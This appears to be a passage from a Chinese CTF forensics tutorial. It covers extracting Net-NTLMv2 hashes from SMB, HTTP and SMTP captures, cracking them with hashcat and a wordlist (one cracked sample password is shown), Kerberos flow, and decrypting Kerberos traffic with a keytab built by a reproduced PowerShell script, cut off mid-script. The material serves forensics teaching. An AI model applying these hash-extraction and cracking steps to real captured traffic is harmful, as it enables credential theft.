			使用前面得到的 3 个 DES 密钥，分别对这个 8 字节数据进行加密，生成 3 段 8 字节密文，组合成 24 字节的响应。

2. Net-NTLMv2 的生成

	计算 NTLMv2 Hash：
	
		将大写用户名（Unicode 编码）与认证目标（Type 3 消息中的 TargetName，如域名，区分大小写）拼接。
		
		以用户的 16 字节 NT Hash 为密钥，使用 HMAC-MD5 算法对上述拼接字符串进行加密，得到 16 字节的 NTLMv2 Hash。

	构建 Blob：

		一个包含时间戳、客户端挑战、目标信息等数据的结构。

	计算 NTProofStr：

		将来自 Type 2 消息的 Server Challenge 与步骤 2 构建的 Blob 拼接。
		
		以步骤 1 得到的 NTLMv2 Hash 为密钥，使用 HMAC-MD5 算法对拼接后的数据进行加密，得到 16 字节的 NTProofStr。

	生成最终 Response：

		将 NTProofStr 和 Blob 拼接起来，形成最终的响应。

#### LmCompatibilityLevel（LAN 管理器身份验证级别）

> 这个安全策略决定了客户端在 NTLM 认证中 使用哪种响应类型，以及服务器 接受哪种响应类型。不匹配的设置会导致认证失败。

| 级别值                         | 客户端行为（发送什么）                           | 服务器行为（接受什么）              |
| --------------------------- | ------------------------------------- | ------------------------ |
| 0 - 发送 LM & NTLM 响应         | 只发送 LM 和 NTLMv1 响应。                   | 接受 LM, NTLM, NTLMv2。     |
| 1 - 使用 NTLMv2 会话安全          | 发送 LM 和 NTLMv1 响应，但会尝试协商 NTLMv2 会话安全。 | 接受 LM, NTLM, NTLMv2。     |
| 2 - 仅发送 NTLM 响应             | 只发送 NTLMv1 响应。                        | 接受 LM, NTLM, NTLMv2。     |
| 3 - 仅发送 NTLMv2 响应           | 只发送 NTLMv2 和 LMv2 响应。                 | 接受 LM, NTLM, NTLMv2。     |
| 4 - 仅发送 NTLMv2/拒绝 LM        | 只发送 NTLMv2 和 LMv2 响应。                 | 拒绝 LM，只接受 NTLM 和 NTLMv2。 |
| 5 - 仅发送 NTLMv2/拒绝 LM & NTLM | 只发送 NTLMv2 和 LMv2 响应。                 | 拒绝 LM 和 NTLM，只接受 NTLMv2。 |

NTLMv2流量分析需要的信息，在追踪流中是找不到的，需要我们深入分析具体的每个流量包

可以在Wireshark中用关键字 ntlmssp 过滤，然后在成功认证的流量包的分组详情中提取我们需要的字段

当然也可以用这个[开源项目](https://github.com/mlgualtieri/NTLMRawUnHide/blob/master/NTLMRawUnHide.py)中的脚本自动识别并提取

![](imgs/图片.webp)

### NTLMv2 认证的SMB流量

> 1.过滤出ntlmssp的请求包，查看 Session Set Request 并复制NTLMSSP_AUTH包中Security Blob层的User name、Domain name
> 
> 2.查看NTLMSSP_AUTH包中的NTLM响应，并复制出ntlmv2_response以及ntproofstr3
> 
> 3.过滤出ntlmssp的请求包，查看Session Set Response 并复制出NTLM Server Challenge的值，通常这个数据包是在NTLM_Auth数据包之前
> 
> 4.把以上内容按照固定格式组合并保存到hash.txt中
> 
> **username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response**
> 
> 这里要注意ntlmv2response的开头就是NTproofstring，因此分开来组合
> 
> 5.使用hashcat爆破hash值
> 
> .\hashcat -a 0 -m 5600 hash.txt .\rockyou.txt

```
username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response
```

```
administrator::WIN2008:9a88373dbb4f5e36:4eb74543b9962bb2ca36e938909bb930:0101000000000000d23c83f972f7d9015e866dc6343b804400000000020008004800410043004b000100040044004300040010006800610063006b002e0063006f006d0003001600440043002e006800610063006b002e0063006f006d00050010006800610063006b002e0063006f006d0007000800d23c83f972f7d9010600040002000000080030003000000000000000000000000030000046fc5f0d124bc9b99b5b560c14cd7c7e217f08f22ef5f223679ec2c576230fa30a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e00310036002e0031003000000000000000000000000000
```

最后使用 hashcat 进行爆破

```
hashcat -m 5600 hash.txt rockyou.txt
```

```bash
$ hashcat -m 5600 hash.txt rockyou.txt --show
ADMINISTRATOR::WIN2008:9a88373dbb4f5e36:4eb74543b9962bb2ca36e938909bb930:0101000000000000d23c83f972f7d9015e866dc6343b804400000000020008004800410043004b000100040044004300040010006800610063006b002e0063006f006d0003001600440043002e006800610063006b002e0063006f006d00050010006800610063006b002e0063006f006d0007000800d23c83f972f7d9010600040002000000080030003000000000000000000000000030000046fc5f0d124bc9b99b5b560c14cd7c7e217f08f22ef5f223679ec2c576230fa30a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e00310036002e0031003000000000000000000000000000:qwe123!@#
```

### NTLMv2 认证的HTTP流量

大致步骤和SMB协议的差不多，就是NTLM信息放在了 hypertext transport protocol 中
按照之前的步骤提取出来，然后 hashcat 爆破即可

```
username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response
```

```
jack::WIDGETLLC:2af71b5ca7246268:2d1d24572b15fe544043431c59965d30:0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000
```

### NTLMv2 认证的STMP流量

这里的NTLM流量信息可能base64编码过了，所以分析前需要base64解码：

![](imgs/N6.png)

后续步骤就和之前一样了，提取信息然后用 hashcat 爆破

**NTLMv2 中 NTproofstring 生成过程如下：**

```python
import hashlib
import hmac

user_name = "admin"
password = "QUICAUTH-CCC123!@#"
domain_name = "SecretServer"

# 使用MD4消息摘要算法得到16字节的 NTLM_HASH
ntlm_hash = hashlib.new("md4", password.encode("utf-16-le")).digest().hex()
print(f"NTLM Hash: {ntlm_hash}")

user_domain_name = user_name.upper().encode("utf-16-le")+domain_name.upper().encode("utf-16-le")
print(f"User Domain Data: {user_domain_name}")

# 使用 NTLM_HASH 作为密钥对用户名域名进行MD5加密
firstHMAC = hmac.new(bytes.fromhex(ntlm_hash), user_domain_name, hashlib.md5).hexdigest()
print(f"First HMAC Result: {firstHMAC}")

ntlm_authentication_data = "d158262017948de9010100000000000058b2da67cbe0d001c575cfa48d38bec50000000002001600450047004900540049004d002d00500043003100340001001600450047004900540049004d002d00500043003100340004001600650067006900740069006d002d00500043003100340003001600650067006900740069006d002d0050004300310034000700080058b2da67cbe0d0010600040002000000080030003000000000000000000000000030000065d85a4000a167cdbbf6eff657941f52bc9ee2745e11f10c61bb24db541165800a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e00310030003700000000000000000000000000"

NTproofstring = hmac.new(bytes.fromhex(firstHMAC), bytes.fromhex(ntlm_authentication_data), hashlib.md5).hexdigest()
print(NTproofstring)

# NTLM Hash: 61a26d3fee855453bc125700bc8cf6f2
# User Domain Data: b'A\x00D\x00M\x00I\x00N\x00S\x00E\x00C\x00R\x00E\x00T\x00S\x00E\x00R\x00V\x00E\x00R\x00'
# First HMAC Result: 7d3ce509093fb2b7bcbbe7939fa8ee74
# efa243f442b9d683eb1b00a2b1a0c9fc
```

例题1-2024数据安全产业人才积分争夺赛 Strangesystem

## kerberos认证流量分析

### kerberos认证的基本概念

Kerberos 是一种由麻省理工大学提出的网络身份验证协议，其设计目标是通过密钥加密技术为客户端与服务器应用程序提供强身份验证。该协议的认证过程不依赖于主机操作系统的认证机制，也不基于主机地址的信任关系，同时不要求网络中所有主机在物理上的绝对安全，并假设网络数据包可能被任意读取、修改或插入。在此背景下，Kerberos 作为可信任的第三方认证服务，依托传统的密码技术（如共享密钥）来执行身份验证。

在 Kerberos 协议中主要存在三个角色：

一是访问服务的客户端，即用户；

二是提供服务的服务器；

三是密钥分发中心，简称 KDC。

> KDC 通常默认安装在域环境的域控制器上，而客户端和服务器则可以是域内的用户或服务，例如 HTTP 服务或数据库服务。Kerberos 通过 KDC 签发票据来控制客户端是否有权限访问某一服务。

### kerberos认证的完整流程

第一阶段：用户初始认证与 TGT 获取 (AS Exchange)

	1. AS-REQ (认证服务请求)
	
		客户端向密钥分发中心(KDC)的认证服务(AS)发送请求。
		
		客户端将其密码生成的哈希值作为密钥，加密一个当前时间戳，并将此加密后的时间戳作为认证因子发送给 KDC。

	2. AS-REP (认证服务回复)
	
		KDC 从数据库中获取该用户的密码哈希，尝试解密时间戳。如果解密成功且时间戳在允许的时间偏差内，则验证通过。
		
		验证成功后，KDC 会创建一个票据授予票据(TGT)。这个 TGT 中包含一个关键结构——特权属性证书(PAC)，PAC 里记录了用户的安全标识符(SID)和所属组信息。
		
		KDC 使用自己的密钥(KDC Key)加密整个 TGT，然后将其发送回客户端。
		
		客户端收到加密的 TGT，但由于没有 KDC 的密钥，无法解密它，只能安全地保存起来。

第二阶段：申请访问特定服务的票据 (TGS Exchange)

	1. TGS-REQ (票据授予服务请求)
	
		当客户端需要访问某个特定服务（如文件共享、邮箱等）时，它会向 KDC 的票据授予服务(TGS)发起请求。
		
		请求中包含之前获得的 TGT（仍由 KDC 密钥加密）以及一个使用服务名称等信息生成的认证符。
	
	2. TGS-REP (票据授予服务回复)
	
		KDC 验证 TGT 的有效性（通过解密并检查其有效性）。
		
		关键点：只要 TGT 有效，KDC 就会批准请求，而不会在此阶段判断用户是否有权访问该服务。
		
		KDC 会复制 TGT 中的 PAC 数据，并生成一个针对目标服务的服务票据(Service Ticket)。
		
		KDC 使用目标服务账户的密码哈希作为密钥来加密这个服务票据，然后将其发送给客户端。

第三阶段：访问服务与最终权限验证 (AP Exchange)

	1. AP-REQ (应用请求)
	
		客户端向目标服务程序发起访问请求。
		
		请求中提交之前获得的服务票据（由服务密码哈希加密）以及一个新的认证符。
	
	2. AP-REP (应用回复) & PAC 验证
	
		服务端使用自身的密码哈希来解密服务票据。如果解密成功，则证明票据是真实的KDC颁发的。
		
		服务端从解密后的票据中提取出 PAC 信息。
		
		为了确定用户的具体访问权限，服务端会将 PAC 发送给 KDC（具体是 KDC 的域控制器），请求查询该用户的最终权限。
		
		KDC 解密 PAC，读取其中的用户 SID 和组信息，再结合该服务资源的访问控制列表(ACL)，进行最终的权限判断。
		
		KDC 将权限判定结果返回给服务端。
		
		服务端根据这个结果决定是批准还是拒绝客户端的访问，从而完成整个认证与授权流程。

> 关于 PAC (特权属性证书) 的补充说明:
> 
> PAC 是微软为 Kerberos 协议引入的关键扩展，其核心作用是在票据中嵌入用户的身份标识和组信息，从而解决标准协议无法区分用户权限的问题。为确保其安全性和完整性，PAC 被封装在由 KDC 密钥加密的 TGT 内部，并且其本身附加了分别由 KDC 密钥和服务端密码哈希加密的两个数字签名。在最终的授权阶段，服务端会将这些签名提交给 KDC 进行有效性校验，KDC 在确认 PAC 未被篡改后，才会依据其中的用户信息返回最终的权限判定。


### 解密Kerberos认证加密的流量

解密 Kerberos 认证加密的流量，需要制作 keytab 文件，并在 wireshark 中 协议 -> KRB5 导入制作好的 keytab 文件

![](imgs/image-20251105142610867.png)

制作 keytab 文件所需的 Realm(域名) 和 principal(主体名) 可以从 KRB5 的 AS-REP 中获取（这里要特别注意大小写）

因为这里的 salt（加密派生盐值）是 Realm + principal，并且保留了大小写，因此我们直接使用 salt 中的信息即可

![](imgs/image-20251105142832603.png)

然后就可以用下面这几个方法制作 keytab 文件

方法一：可以借助[这个项目](https://github.com/TheRealAdamBurford/Create-KeyTab)生成 keytab 文件

![](imgs/image-20251105142512436.png)

为了预防线下断网的情况，我这里也贴一份这个 ps1 脚本

```powershell
<#PSScriptInfo
.VERSION 1.0.2
.GUID 325f7f9a-87be-42ec-ba96-c5e423718284
.AUTHOR TRAB
.COMPANYNAME
.COPYRIGHT
.TAGS KeyTab Ktpass Key Tab
.LICENSEURI https://github.com/TheRealAdamBurford/Create-KeyTab/blob/master/LICENSE
.PROJECTURI https://github.com/TheRealAdamBurford/Create-KeyTab
.ICONURI
.EXTERNALMODULEDEPENDENCIES 
.REQUIREDSCRIPTS
.EXTERNALSCRIPTDEPENDENCIES
.RELEASENOTES
.PRIVATEDATA
#>

<# 
.DESCRIPTION 
 This scipt will generate off-line keytab files for use with Active Directory (AD). While the script is designed to work independently of AD, this script can be used with a wrapper script that uses Get-ADUser or Get-ADObject to retrieve the UPN of a samaccountname or a list of samaccountnames for use in batch processing of KeyTab creation. More information at https://therealadamburford.github.io/Create-KeyTab/ 
#> 
##########################################################
###
###      Create-KeyTab.ps1
###
###      Created : 2019-10-26
###      Modified: 2020-10-26
###
###      Created By : Adam Burford
###      Modified By: Adam Burford
###
###
### Notes: Create RC4-HMAC, AES128. AES256 KeyTab file. Does not use AD. 
### Password, ServicePRincipal/UPN must be set on AD account.
### Future add may include option AD lookup for Kvno, SPN and UPN.
###
### 2019-11-11 - Added custom SALT option
### 2019-11-11 - Added current Epoch Time Stamp.
### 2019-11-12 - Added -Append option
### 2019-11-12 - Added -Quiet and -NoPrompt switches for use in batch mode
### 2019-11-14 - Added support for UPN format primary/principal (e.g. host/www.domain.com). The principal is split into an array. 
###              The slash is removed from the SALT calculation.
###
### 2019-11-18 - Changed output text. RC4,AES128,AES256
### 2019-11-18 - Created static nFold output.
### 2019-11-26 - Added a Get-Password function to mask password prompt input
### 2020-01-30 - Add Info for posting to https://www.powershellgallery.com
### 2020-09-15 - Added suggested use of [decimal]::Parse from "https://github.com/matherm-aboehm" to fix timestamp error on localized versions of Windows. Line 535.
### 2020-10-26 - Add KRB5_NT_SRV_HST to possible PType values
###
##########################################################
### Attribution:
### https://tools.ietf.org/html/rfc3961
### https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/936a4878-9462-4753-aac8-087cd3ca4625?redirectedfrom=MSDN
### https://github.com/dfinke/powershell-algorithms/blob/master/src/algorithms/math/euclidean-algorithm/euclideanAlgorithm.ps1
### https://afana.me/archive/2016/12/29/how-mit-keytab-files-store-passwords.aspx/
### http://www.ioplex.com/utilities/keytab.txt

<#
.SYNOPSIS
This script will generate and append version 502 KeyTab files

.DESCRIPTION
Required Parameters

-Realm     : The Realm for the KeyTab
-Principal : The Principal for the KeyTab. Case sensative for AES SALT. Default REALM+Principal
-Password  : 

Optional Parameters

-SALT      : Use a custom SALT
-File      : KeyTab File Path. Default = CurrentDirectory\login.keytab
-KVNO      : Default = 1. Exceeding 255 will wrap the KVNO. THe 32bit KVNO field is not implimented.
-PType     : Default = KRB5_NT_PRINCIPAL
-RC4       : Generate RC4 Key
-AES128    : Generate AES128 Key
-AES256    : Generate AES256 Key - This is default if no Etype switch is set.
-Append    : Append Key Data to an existing KeyTab file.
-Quiet     : Suppress Text Output
-NoPrompt  : Suppress Write KeyTab File Prompt

.EXAMPLE
.\Create-KeyTab.ps1
.EXAMPLE
.\Create-KeyTab.ps1 -AES256 -AES128 -RC4
.EXAMPLE
.\Create-KeyTab.ps1 -AES256 -AES128 -Append
.EXAMPLE
.\Create-KeyTab.ps1 -AES256 -AES128 -SALT "MY.REALM.COMprincipalname"
.EXAMPLE
.\Create-KeyTab.ps1 -Realm "MY.REALM.COM" -Principal "principalname" -Password "Secret" -File "c:\temp\login.keytab"

.NOTES
Use -QUIET and -NOPROMPT for batch mode processing.

.LINK
https://www.linkedin.com/in/adamburford
#>
param (
[Parameter(Mandatory=$true,HelpMessage="REALM name will be forced to Upper Case")]$Realm,
[Parameter(Mandatory=$true,HelpMessage="Principal is case sensative. It must match the principal portion of the UPN",ValueFromPipelineByPropertyName=$true)]$Principal,
[Parameter(Mandatory=$false)]$Password,
[Parameter(Mandatory=$false)]$SALT,
[Parameter(Mandatory=$false)]$File,
[Parameter(Mandatory=$false,ValueFromPipelineByPropertyName=$true)]$KVNO=1,
[Parameter(Mandatory=$false)][ValidateSet("KRB5_NT_PRINCIPAL", "KRB5_NT_SRV_INST", "KRB5_NT_SRV_HST", "KRB5_NT_UID")][String[]]$PType="KRB5_NT_PRINCIPAL",
[Parameter(Mandatory=$false)][Switch]$RC4,
[Parameter(Mandatory=$false)][Switch]$AES128,
[Parameter(Mandatory=$false)][Switch]$AES256,
[Parameter(Mandatory=$false)][Switch]$Append,
[Parameter(Mandatory=$false)][Switch]$Quiet,
[Parameter(Mandatory=$false)][Switch]$NoPrompt
)

function Get-MD4{
    PARAM(
        [String]$String,
        [Byte[]]$bArray,
        [Switch]$UpperCase
    )
    
    # Author: Larry.Song@outlook.com
    # https://github.com/LarrysGIT/MD4-powershell
    # Reference: https://tools.ietf.org/html/rfc1320
    # MD4('abc'): a448017aaf21d8525fc10ae87aa6729d
    $Array = [byte[]]@()
    if($String)
    {
        $Array = [byte[]]@($String.ToCharArray() | %{[int]$_})
    }
    if($bArray)
    {
        $Array = $bArray
    }
    # padding 100000*** to length 448, last (64 bits / 8) 8 bytes fill with original length
    # at least one (512 bits / 8) 64 bytes array
    $M = New-Object Byte[] (([math]::Floor($Array.Count/64) + 1) * 64)
    # copy original byte array, start from index 0
    $Array.CopyTo($M, 0)
    # padding bits 1000 0000
    $M[$Array.Count] = 0x80
    # padding bits 0000 0000 to fill length (448 bits /8) 56 bytes
    # Default value is 0 when creating a new byte array, so, no action
    # padding message length to the last 64 bits
    @([BitConverter]::GetBytes($Array.Count * 8)).CopyTo($M, $M.Count - 8)

    # message digest buffer (A,B,C,D)
    $A = [Convert]::ToUInt32('0x67452301', 16)
    $B = [Convert]::ToUInt32('0xefcdab89', 16)
    $C = [Convert]::ToUInt32('0x98badcfe', 16)
    $D = [Convert]::ToUInt32('0x10325476', 16)
    
    # There is no unsigned number shift in C#, have to define one.
    Add-Type -TypeDefinition @'
public class Shift
{
  public static uint Left(uint a, int b)
    {
        return ((a << b) | (((a >> 1) & 0x7fffffff) >> (32 - b - 1)));
    }
}
'@

    # define 3 auxiliary functions
    function FF([uint32]$X, [uint32]$Y, [uint32]$Z)
    {
        (($X -band $Y) -bor ((-bnot $X) -band $Z))
    }
    function GG([uint32]$X, [uint32]$Y, [uint32]$Z)
    {
        (($X -band $Y) -bor ($X -band $Z) -bor ($Y -band $Z))
    }
    function HH([uint32]$X, [uint32]$Y, [uint32]$Z){
        ($X -bxor $Y -bxor $Z)
    }
    # processing message in one-word blocks
    for($i = 0; $i -lt $M.Count; $i += 64)
    {
        # Save a copy of A/B/C/D
        $AA = $A
        $BB = $B
        $CC = $C
        $DD = $D

        # Round 1 start
        $A = [Shift]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 0)..($i + 3)], 0)) -band [uint32]::MaxValue, 3)
        $D = [Shift]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 4)..($i + 7)], 0)) -band [uint32]::MaxValue, 7)
        $C = [Shift]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 8)..($i + 11)], 0)) -band [uint32]::MaxValue, 11)
        $B = [Shift]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 12)..($i + 15)], 0)) -band [uint32]::MaxValue, 19)

        $A = [Shift]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 16)..($i + 19)], 0)) -band [uint32]::MaxValue, 3)
        $D = [Shift]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 20)..($i + 23)], 0)) -band [uint32]::MaxValue, 7)
        $C = [Shift]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 24)..($i + 27)], 0)) -band [uint32]::MaxValue, 11)
        $B = [Shift]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 28)..($i + 31)], 0)) -band [uint32]::MaxValue, 19)

        $A = [Shift]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 32)..($i + 35)], 0)) -band [uint32]::MaxValue, 3)
        $D = [Shift]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 36)..($i + 39)], 0)) -band [uint32]::MaxValue, 7)
        $C = [Shift]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 40)..($i + 43)], 0)) -band [uint32]::MaxValue, 11)
        $B = [Shift]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 44)..($i + 47)], 0)) -band [uint32]::MaxValue, 19)

        $A = [Shift]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 48)..($i + 51)], 0)) -band [uint32]::MaxValue, 3)
        $D = [Shift]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 52)..($i + 55)], 0)) -band [uint32]::MaxValue, 7)
        $C = [Shift]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 56)..($i + 59)], 0)) -band [uint32]::MaxValue, 11)
        $B = [Shift]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 60)..($i + 63)], 0)) -band [uint32]::MaxValue, 19)
        # Round 1 end
        # Round 2 start
        $A = [Shift]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 0)..($i + 3)], 0) + 0x5A827999) -band [uint32]::MaxValue, 3)
        $D = [Shift]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 16)..($i + 19)], 0) + 0x5A827999) -band [uint32]::MaxValue, 5)
        $C = [Shift]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 32)..($i + 35)], 0) + 0x5A827999) -band [uint32]::MaxValue, 9)
        $B = [Shift]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 48)..($i + 51)], 0) + 0x5A827999) -band [uint32]::MaxValue, 13)

        $A = [Shift]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 4)..($i + 7)], 0) + 0x5A827999) -band [uint32]::MaxValue, 3)
        $D = [Shift]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 20)..($i + 23)], 0) + 0x5A827999) -band [uint32]::MaxValue, 5)
        $C = [Shift]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 36)..($i + 39)], 0) + 0x5A827999) -band [uint32]::MaxValue, 9)
        $B = [Shift]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 52)..($i + 55)], 0) + 0x5A827999) -band [uint32]::MaxValue, 13)

        $A = [Shift]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 8)..($i + 11)], 0) + 0x5A827999) -band [uint32]::MaxValue, 3)
        $D = [Shift]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 24)..($i + 27)], 0) + 0x5A827999) -band [uint32]::MaxValue, 5)
        $C = [Shift]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 40)..($i + 43)], 0) + 0x5A827999) -band [uint32]::MaxValue, 9)
        $B = [Shift]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 56)..($i + 59)], 0) + 0x5A827999) -band [uint32]::MaxValue, 13)

        $A = [Shift]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 12)..($i + 15)], 0) + 0x5A827999) -band [uint32]::MaxValue, 3)
        $D = [Shift]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 28)..($i + 31)], 0) + 0x5A827999) -band [uint32]::MaxValue, 5)
        $C = [Shift]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 44)..($i + 47)], 0) + 0x5A827999) -band [uint32]::MaxValue, 9)
        $B = [Shift]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 60)..($i + 63)], 0) + 0x5A827999) -band [uint32]::MaxValue, 13)
        # Round 2 end
        # Round 3 start
        $A = [Shift]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 0)..($i + 3)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 3)
        $D = [Shift]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 32)..($i + 35)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 9)
        $C = [Shift]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 16)..($i + 19)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 11)
        $B = [Shift]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 48)..($i + 51)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 15)

        $A = [Shift]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 8)..($i + 11)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 3)
        $D = [Shift]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 40)..($i + 43)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 9)
        $C = [Shift]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 24)..($i + 27)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 11)
        $B = [Shift]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 56)..($i + 59)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 15)

        $A = [Shift]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 4)..($i + 7)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 3)
        $D = [Shift]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 36)..($i + 39)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 9)
        $C = [Shift]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 20)..($i + 23)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 11)
        $B = [Shift]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 52)..($i + 55)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 15)

        $A = [Shift]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 12)..($i + 15)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 3)
        $D = [Shift]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 44)..($i + 47)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 9)
        $C = [Shift]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 28)..($i + 31)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 11)
        $B = [Shift]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 60)..($i + 63)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 15)
        # Round 3 end
        # Increment start
        $A = ($A + $AA) -band [uint32]::MaxValue
        $B = ($B + $BB) -band [uint32]::MaxValue
        $C = ($C + $CC) -band [uint32]::MaxValue
        $D = ($D + $DD) -band [uint32]::MaxValue
        # Increment end
    }
    # Output start
    $A = ('{0:x8}' -f $A) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
    $B = ('{0:x8}' -f $B) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
    $C = ('{0:x8}' -f $C) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
    $D = ('{0:x8}' -f $D) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
    # Output end

    if($UpperCase)
    {
        return "$A$B$C$D".ToUpper()
    }
    else
    {
        return "$A$B$C$D"
    }
}

function Get-PBKDF2 {
param (
[Parameter(Mandatory=$true)]$PasswordString,
[Parameter(Mandatory=$true)]$SALT,
[Parameter(Mandatory=$true)][ValidateSet("16", "32")][String[]]$KeySize
)

### Set Key Size
switch($KeySize){
"16"{
    [int] $size = 16
    break;
    }
"32"{
    [int] $size = 32
    break;
     }
default{}
}

[byte[]] $password = [Text.Encoding]::UTF8.GetBytes($PasswordString)
[byte[]] $saltBytes = [Text.Encoding]::UTF8.GetBytes($SALT)

#PBKDF2 IterationCount=4096
$deriveBytes = new-Object Security.Cryptography.Rfc2898DeriveBytes($password, $saltBytes, 4096)

<#
$hexStringSALT = Get-HexStringFromByteArray -Data $deriveBytes.Salt    
Write-Host "SALT (HEX):"$hexStringSALT -ForegroundColor Yellow
#>

return $deriveBytes.GetBytes($size)
}

function Encrypt-AES {
param (
[Parameter(Mandatory=$true)]$KeyData,
[Parameter(Mandatory=$true)]$IVData,
[Parameter(Mandatory=$true)]$Data
)

### AES 128-CTS
# KeySize = 16
# AESKey = Encrypt-AES -KeyData PBKdf2 -IVData IV -Data NFoldText

### AES 256-CTS
# KeySize = 32
# K1 = Encrypt-AES -KeyData PBKdf2 -IVData IV -Data NFoldText
# K2 = Encrypt-AES -KeyData PBKdf2 -IVData IV -Data K1
# AESKey = K1 + K2

# Create AES Object
    $Aes = $null
    $encryptor = $null
    $memStream = $null
    $cryptoStream = $null
